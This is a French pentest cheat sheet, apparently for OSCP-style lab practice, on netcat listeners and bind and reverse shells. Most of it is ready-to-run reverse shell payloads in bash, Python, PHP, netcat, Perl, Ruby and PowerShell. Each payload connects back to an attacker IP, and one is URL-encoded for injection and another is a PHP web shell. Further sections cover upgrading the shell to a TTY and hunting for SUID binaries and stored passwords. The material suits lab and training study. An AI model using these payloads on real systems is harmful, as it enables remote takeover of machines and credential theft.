# <span style="color:orange;">5. Shells & Netcat</span>

## 5.1 Reverse Shell - Listener

**Écouter sur port 9090 :**

```bash
nc -vlp 9090
netcat -vlp 9090

# Avec ncat (version améliorée)
ncat -vlp 9090 --ssl  # SSL reverse shell
```

**Options :**

- `-v` : Verbose
- `-l` : Listen mode
- `-p 9090` : Port

**Workflow :**

1. Lance listener sur Kali
2. Victime exécute reverse shell pointant vers IP Kali:9090
3. Shell apparaît dans terminal listener

---

## 5.2 Bind Shell - Connexion

**Se connecter à bind shell :**

```bash
nc enum-sandbox 9999
netcat enum-sandbox 9999
```

**Différence Bind vs Reverse :**

- **Bind** : Victime écoute, tu te connectes
- **Reverse** : Tu écoutes, victime se connecte à toi

---

## 5.3 Reverse Shells - Payloads Courants

**Bash :**

```bash
bash -i >& /dev/tcp/192.168.45.217/9090 0>&1

# Alternative
bash -c 'bash -i >& /dev/tcp/192.168.45.217/9090 0>&1'

# URL encoded (pour injection)
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.56%2F9090%200%3E%261%27
```

---

**Python :**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.56",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.56",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

**PHP :**

```php
php -r '$sock=fsockopen("192.168.45.217",9090);exec("/bin/sh -i <&3 >&3 2>&3");'

# Dans fichier PHP
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.49.56/9090 0>&1'"); ?>
```

---

**Netcat :**

```bash
# Avec -e (si supporté)
nc -e /bin/bash 192.168.49.56 9090

# Sans -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.56 9090 >/tmp/f
```

---

**Perl :**

```perl
perl -e 'use Socket;$i="192.168.49.56";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

**Ruby :**

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.49.56",9090).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

**PowerShell (Windows) :**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.56',9090);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 5.4 Upgrade Shell (TTY)

**Une fois shell obtenu, upgrade vers TTY interactif :**

```bash
# Python
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Puis (pour CTRL+C, historique, etc.)
# 1. Dans reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# 2. Suspend (CTRL+Z)

# 3. Sur Kali:
stty raw -echo; fg

# 4. Dans reverse shell:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # Adapter à ton terminal
```

---

**Autres méthodes upgrade :**

```bash
# Script
script /dev/null -c bash

# Perl
perl -e 'exec "/bin/sh";'

# Vi
:!bash

# Nmap (anciennes versions)
nmap --interactive
!sh
```

---

## 5.5 Commandes Shell Utiles

**Une fois shell obtenu :**

```bash
whoami          # Utilisateur courant
hostname        # Nom machine
id              # UID, GID, groupes
pwd             # Répertoire courant
ls -la          # Lister fichiers (tous, détails)
cat /etc/passwd # Lire fichiers
find / -name flag.txt 2>/dev/null  # Chercher fichiers
uname -a        # Kernel version
cat /etc/os-release  # OS info
sudo -l         # Sudo permissions
env             # Variables d'environnement
ps aux          # Processus en cours
netstat -antup  # Connexions réseau
ss -tulpn       # Sockets (alternative netstat)
```

---

**Chercher fichiers intéressants :**

```bash
# Flags
find / -name local.txt 2>/dev/null
find / -name proof.txt 2>/dev/null

# SUID binaries (privesc)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -perm -2 -type f 2>/dev/null

# Credentials
grep -r "password" /var/www/ 2>/dev/null
grep -r "mysql" /var/www/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass"
```

---
